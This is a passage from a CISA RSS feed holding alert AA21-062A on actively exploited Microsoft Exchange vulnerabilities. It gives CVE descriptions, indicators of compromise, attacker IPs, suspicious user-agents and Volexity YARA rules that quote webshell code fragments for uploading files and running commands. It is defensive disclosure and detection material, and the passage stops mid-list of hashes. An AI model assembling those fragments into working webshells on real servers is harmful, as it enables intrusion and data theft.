		&lt;ul&gt;			            &lt;li&gt;March 17, 2021: Initial Version&lt;/li&gt;			            &lt;li&gt;March 24, 2021: Added MITRE ATT&amp;CK Technique T1592.003 used for reconnaissance&lt;/li&gt;			            &lt;li&gt;May 20, 2021: Added new MITRE ATT&amp;CKs and updated Table 1&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Wed, 17 Mar 2021 15:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16383 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-062A: Mitigate Microsoft Exchange Server Vulnerabilities</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-062a</link>
	<description>Original release date: March 3, 2021 | Last revised: April 14, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This Alert was updated April 13, 2021, to provide further guidance.&amp;nbsp;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Cybersecurity and Infrastructure Security Agency (CISA) partners have observed active exploitation of vulnerabilities in Microsoft Exchange Server products. Successful exploitation of these vulnerabilities allows an unauthenticated attacker to execute arbitrary code on vulnerable Exchange Servers, enabling the attacker to gain persistent system access, as well as access to files and mailboxes on the server and to credentials stored on that system. Successful exploitation may additionally enable the attacker to compromise trust and identity in a vulnerable network. Microsoft released out-of-band patches to address vulnerabilities in Microsoft Exchange Server. The vulnerabilities impact on-premises Microsoft Exchange Servers and are not known to impact Exchange Online or Microsoft 365 (formerly O365) cloud email services.&lt;/p&gt;

&lt;p&gt;This Alert includes both tactics, techniques and procedures (TTPs) and the indicators of compromise (IOCs) associated with this malicious activity. To secure against this threat, CISA recommends organizations examine their systems for the TTPs and use the IOCs to detect any malicious activity. If an organization discovers exploitation activity, they should assume network identity compromise and follow incident response procedures. If an organization finds no activity, they should apply available patches immediately and implement the mitigations in this Alert.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-062A.stix.xml"&gt;Click here for IOCs in STIX format.&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;&lt;em&gt;(Updated April 14, 2021)&lt;/em&gt;: &lt;a href="https://msrc.microsoft.com/update-guide/releaseNote/2021-Apr"&gt;Microsoft's April 2021 Security Update&lt;/a&gt; newly discloses and mitigates significant vulnerabilities affecting on-premises Exchange Server 2013, 2016, and 2019.&lt;/p&gt;

&lt;p&gt;Microsoft has released out-of-band security updates to address four vulnerabilities in Exchange Server:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855"&gt;CVE-2021-26855&lt;/a&gt; allows an unauthenticated attacker to send arbitrary HTTP requests and authenticate as the Exchange Server. The vulnerability exploits the Exchange Control Panel (ECP) via a Server-Side Request Forgery (SSRF). This would also allow the attacker to gain access to mailboxes and read sensitive information.&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26857"&gt;CVE-2021-26857&lt;/a&gt;, &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26858"&gt;CVE-2021-26858&lt;/a&gt;, and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27065"&gt;CVE-2021-27065&lt;/a&gt; allow for remote code execution. &amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;
		&lt;p&gt;CVE-2021-26858 and CVE-2021-27065 are similar post-authentication arbitrary write file vulnerabilities in Exchange. An attacker, authenticated either by using CVE-2021-26855 or via stolen admin credentials, could write a file to any path on the server.&lt;/p&gt;
		&lt;/li&gt;
		&lt;li&gt;
		&lt;p&gt;CVE-2021-26857 is an insecure deserialization vulnerability in the Unified Messaging service. An attacker, authenticated either by using CVE-2021-26855 or via stolen admin credentials, could execute arbitrary code as &lt;code&gt;SYSTEM &lt;/code&gt;on the Exchange Server.&lt;/p&gt;
		&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;
	&lt;p&gt;To locate a possible compromise of these CVEs, CISA encourages organizations&amp;nbsp;read the &lt;a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;Microsoft Advisory&lt;/a&gt;.&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It is possible for an attacker, once authenticated to the Exchange server, to gain access to the Active Directory environment and download the Active Directory Database.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 12, 2021):&lt;/em&gt; Microsoft Security Intelligence has released a &lt;a href="https://twitter.com/MsftSecIntel/status/1370236539427459076"&gt;tweet&lt;/a&gt; on &lt;a href="https://www.bleepingcomputer.com/news/security/ransomware-now-attacks-microsoft-exchange-servers-with-proxylogon-exploits/"&gt;DearCry&lt;/a&gt; ransomware being used to exploit compromised on-premises Exchange Servers. Ransomware infections can have negative consequences to an affected organization, including:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;temporary or permanent loss of sensitive or proprietary information,&lt;/li&gt;
	&lt;li&gt;disruption to regular operations,&lt;/li&gt;
	&lt;li&gt;financial losses incurred to restore systems and files, and&lt;/li&gt;
	&lt;li&gt;potential harm to an organization’s reputation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(&lt;em&gt;Updated April 12, 2021&lt;/em&gt;): CISA recommends organizations review Malware Analysis Report (MAR) &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-102b"&gt;MAR-10330097-1.v1 – DearCry Ransomware&lt;/a&gt; for detailed analysis, along with TTPs and IOCs.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 12, 2021): &lt;/em&gt;CISA encourages organizations to review CISA’s &lt;a href="https://www.cisa.gov/ransomware"&gt;Ransomware web page&lt;/a&gt; for guidance and resources. Victims of ransomware should report it immediately to CISA at &lt;a href="https://www.us-cert.gov/report"&gt;www.us-cert.gov/report&lt;/a&gt;, a local&lt;a href="https://www.fbi.gov/contact-us/field-offices"&gt; FBI Field Office&lt;/a&gt;, or &lt;a href="http://www.secretservice.gov/contact/field-offices/"&gt;Secret Service Field Office&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;Tactics, Techniques and Procedures&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;(Updated March 10, 2021):&lt;/em&gt; Microsoft has released a script that scans Exchange log files for IOCs. CISA strongly encourages organizations to run the &lt;a href="https://github.com/microsoft/CSS-Exchange/tree/main/Security"&gt;Test-ProxyLogon.ps1 script&lt;/a&gt;—as soon as possible—to help determine whether their systems are compromised.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 16, 2021): &lt;/em&gt;&lt;strong&gt;Note:&lt;/strong&gt; Microsoft has released the &lt;a href="https://msrc-blog.microsoft.com/2021/03/15/one-click-microsoft-exchange-on-premises-mitigation-tool-march-2021/"&gt;Exchange On-premises Mitigation Tool (EOMT.ps1)&lt;/a&gt; that can automate portions of both the detection and patching process. Microsoft stated the following along with the release: "[the tool is intended] to help customers who do not have dedicated security or IT teams to apply these security updates. We have tested this tool across Exchange Server 2013, 2016, and 2019 deployments. This new tool is designed as an interim mitigation for customers who are unfamiliar with the patch/update process or who have not yet applied the on-premises Exchange security update.” Review the &lt;a href="https://msrc-blog.microsoft.com/2021/03/15/one-click-microsoft-exchange-on-premises-mitigation-tool-march-2021/"&gt;EOMT.ps1 blog post&lt;/a&gt; for directions on using the tool.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 10, 2021):&lt;/em&gt; CISA recommends investigating for signs of a compromise from at least January 1, 2021&amp;nbsp;through present.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated April 12, 2021): &lt;/em&gt;CISA has identified 10&amp;nbsp;webshells associated with this activity. This is not an all-inclusive list of webshells that are being leveraged by actors. CISA recommends organizations review the following MARs&amp;nbsp;for detailed analysis of the 10&amp;nbsp;webshells, along with TTPs and IOCs. These MARs include&amp;nbsp;CISA-developed YARA rules to help network defenders detect associated malware.&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;AR21-072A: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072a"&gt;MAR-10328877.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072B: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072b"&gt;MAR-10328923.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072C: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072c"&gt;MAR-10329107.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072D: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072d"&gt;MAR-10329297.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072E: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072e"&gt;MAR-10329298.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072F: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072f"&gt;MAR-10329301.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-072G: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-072g"&gt;MAR-10329494.r1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-084A: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084a"&gt;MAR-10329496-1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-084B: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-084b"&gt;MAR-10329499-1.v1: China Chopper Webshell &lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;AR21-102A: &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-102a"&gt;MAR-10331466-1.v1: China Chopper Webshell&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;em&gt;(Updated March 13, 2021):&lt;/em&gt; A webshell is a script that can be uploaded to a compromised Microsoft Exchange Server to enable remote administration of the machine. Webshells are utilized for the following purposes:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;To harvest and exfiltrate sensitive data and credentials;&lt;/li&gt;
	&lt;li&gt;To upload additional malware for the potential of creating, for example, a watering hole for infection and scanning of further victims;&lt;/li&gt;
	&lt;li&gt;To use as a relay point to issue commands to hosts inside the network without direct internet access;&lt;/li&gt;
	&lt;li&gt;To use as command-and-control infrastructure, potentially in the form of a bot in a botnet or in support of compromises to additional external networks. This could occur if the adversary intends to maintain long-term persistence.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;(Updated March 13, 2021): &lt;/em&gt;For more information, see &lt;a href="https://us-cert.cisa.gov/ncas/alerts/TA15-314A"&gt;TA15-314A Compromised Web Servers and Web Shells - Threat Awareness and Guidance&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The majority of the TTPs in this section are sourced from a &lt;a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"&gt;blog post from Volexity&lt;/a&gt;, a third-party cybersecurity firm. &lt;strong&gt;Note: &lt;/strong&gt;the United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.&lt;/p&gt;

&lt;p&gt;Volexity has observed the following files as targets of &lt;code&gt;HTTP POST&lt;/code&gt; requests:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/logon.css&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/owafont_ja.css&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/lgnbotl.gif&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/owafont_ko.css&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;/owa/auth/Current/themes/resources/lgnbotl.gif&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Administrators should search the ECP server logs for the following string (or something similar):&lt;/p&gt;

&lt;p&gt;&lt;code&gt;S:CMD=Set-OabVirtualDirectory.ExternalUrl='&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The logs can be found at &lt;code&gt;&amp;lt;exchange install path&amp;gt;\Logging\ECP\Server\&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To determine possible webshell activity, administrators should search for &lt;code&gt;aspx&lt;/code&gt; files in the following paths:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;\inetpub\wwwroot\aspnet_client\ &lt;/code&gt;(any &lt;code&gt;.aspx&lt;/code&gt; file under this folder or sub folders)&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;\&amp;lt;exchange install path&amp;gt;\FrontEnd\HttpProxy\ecp\auth\ &lt;/code&gt;(any file besides &lt;code&gt;TimeoutLogoff.aspx&lt;/code&gt;)&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;\&amp;lt;exchange install path&amp;gt;\FrontEnd\HttpProxy\owa\auth\ &lt;/code&gt;(any file or modified file that is not part of a standard install)&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;\&amp;lt;exchange install path&amp;gt;\FrontEnd\HttpProxy\owa\auth\Current\ &lt;/code&gt;(any &lt;code&gt;aspx &lt;/code&gt;file in this folder or subfolders)&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;\&amp;lt;exchange install path&amp;gt;\FrontEnd\HttpProxy\owa\auth\&amp;lt;folder with version number&amp;gt;\ &lt;/code&gt;(any &lt;code&gt;aspx &lt;/code&gt;file in this folder or subfolders)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Administrators should search in the &lt;code&gt;/owa/auth/Current&lt;/code&gt; directory for the following non-standard web log user-agents. These agents may be useful for incident responders to look at to determine if further investigation is necessary.&lt;/p&gt;

&lt;p&gt;These should not be taken as definitive IOCs:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;DuckDuckBot/1.0;+(+http://duckduckgo.com/duckduckbot.html)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;facebookexternalhit/1.1+(+http://www.facebook.com/externalhit_uatext.php)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Bingbot/2.0;++http://www.bing.com/bingbot.htm)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+(like+Gecko)+(Exabot-Thumbnails)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Yahoo!+Slurp;+http://help.yahoo.com/help/us/ysearch/slurp)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volexity observed these user-agents in conjunction with exploitation to &lt;code&gt;/ecp/ &lt;/code&gt;URLs:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;ExchangeServicesClient/0.0.0.0&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;python-requests/2.19.1&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;python-requests/2.25.1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These user-agents were also observed having connections to post-exploitation web-shell access:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;antSword/v2.1&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Googlebot/2.1+(+http://www.googlebot.com/bot.html)&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As with the non-standard user-agents, responders can examine internet information services (IIS) logs from Exchange Servers to identify possible historical activity. Also, as with the non-standard user agents, these should not be taken as definitive IOCs:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;POST /owa/auth/Current/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;POST /ecp/default.flt&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;POST /ecp/main.css&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;POST /ecp/&amp;lt;single char&amp;gt;.js&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volexity has seen attackers leverage the following IP addresses. Although these are tied to virtual private servers (VPSs) servers and virtual private networks (VPNs), responders should investigate these IP addresses on their networks and act accordingly:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;103.77.192[.]219&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;104.140.114[.]110&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;104.250.191[.]110&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;108.61.246[.]56&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;149.28.14[.]163&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;157.230.221[.]198&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;167.99.168[.]251&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;185.250.151[.]72&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;192.81.208[.]169&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;203.160.69[.]66&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;211.56.98[.]146&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;5.254.43[.]18&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;5.2.69[.]14&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;80.92.205[.]81&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;91.192.103[.]43&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volexity has also provided the following YARA signatures that can be run within your network to assist in finding signs of a compromise.&lt;/p&gt;

&lt;div class="special_container"&gt;
&lt;p&gt;rule webshell_aspx_simpleseesharp : Webshell Unclassified&lt;br /&gt;
{&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; meta:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; author = "threatintel@volexity.com"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; date = "2021-03-01"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; description = "A simple ASPX Webshell that allows an attacker to write further files to disk."&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; hash = "893cd3583b49cb706b3e55ecb2ed0757b977a21f5c72e041392d1256f31166e2"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; strings:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $header = "&amp;lt;%@ Page Language=\"C#\" %&amp;gt;"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $body = "&amp;lt;% HttpPostedFile thisFile = Request.Files[0];thisFile.SaveAs(Path.Combine"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; condition:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $header at 0 and&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $body and&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; filesize &amp;lt; 1KB&lt;br /&gt;
}&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
rule webshell_aspx_reGeorgTunnel : Webshell Commodity&lt;br /&gt;
{&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; meta:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; author = "threatintel@volexity.com"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; date = "2021-03-01"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; description = "A variation on the reGeorg tunnel webshell"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; hash = "406b680edc9a1bb0e2c7c451c56904857848b5f15570401450b73b232ff38928"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; reference = "https://github.com/sensepost/reGeorg/blob/master/tunnel.aspx"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; strings:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $s1 = "System.Net.Sockets"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $s2 = "System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // a bit more experimental&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $t1 = ".Split(‘|’)"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $t2 = "Request.Headers.Get"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $t3 = ".Substring("&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $t4 = "new Socket("&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $t5 = "IPAddress ip;"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; condition:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; all of ($s*) or&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; all of ($t*)&lt;br /&gt;
}&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
rule webshell_aspx_sportsball : Webshell Unclassified&lt;br /&gt;
{&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; meta:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; author = "threatintel@volexity.com"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; date = "2021-03-01"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; description = "The SPORTSBALL webshell allows attackers to upload files or execute commands on the system."&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; hash = "2fa06333188795110bba14a482020699a96f76fb1ceb80cbfa2df9d3008b5b0a"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; strings:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $uniq1 = "HttpCookie newcook = new HttpCookie(\"fqrspt\", HttpContext.Current.Request.Form"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $uniq2 = "ZN2aDAB4rXsszEvCLrzgcvQ4oi5J1TuiRULlQbYwldE="&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var1 = "Result.InnerText = string.Empty;"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var2 = "newcook.Expires = DateTime.Now.AddDays("&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var3 = "System.Diagnostics.Process process = new System.Diagnostics.Process();"&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var4 = "process.StandardInput.WriteLine(HttpContext.Current.Request.Form[\""&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var5 = "else if (!string.IsNullOrEmpty(HttpContext.Current.Request.Form[\""&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $var6 = "&amp;lt;input type=\"submit\" value=\"Upload\" /&amp;gt;"&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp; condition:&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; any of ($uniq*) or&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; all of ($var*)&lt;br /&gt;
}&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;A list of webshell hashes have also been provided by Microsoft:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e&lt;/code&gt;&lt;/li&gt;
